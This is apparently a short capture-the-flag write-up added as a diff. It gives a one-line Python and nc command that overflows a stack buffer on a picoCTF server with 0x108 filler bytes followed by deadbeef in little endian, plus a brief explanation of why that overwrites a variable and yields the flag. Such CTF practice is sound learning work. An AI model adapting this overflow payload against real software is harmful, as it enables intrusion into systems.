@@ -1,0 +1,7 @@
+python -c "import sys; sys.stdout.buffer.write(b'='*(int('0x110',16)-8)+b'\xef\xbe\xad\xde\x0a')" | nc mars.picoctf.net 31890
+
+we read the stack size in the disassembly for 0x110
+and we know we want to overwrite the last 8 bytes
+because thats the value of the long code variable
+we put deadbeef into little endian and input it 
+to obtain the flag
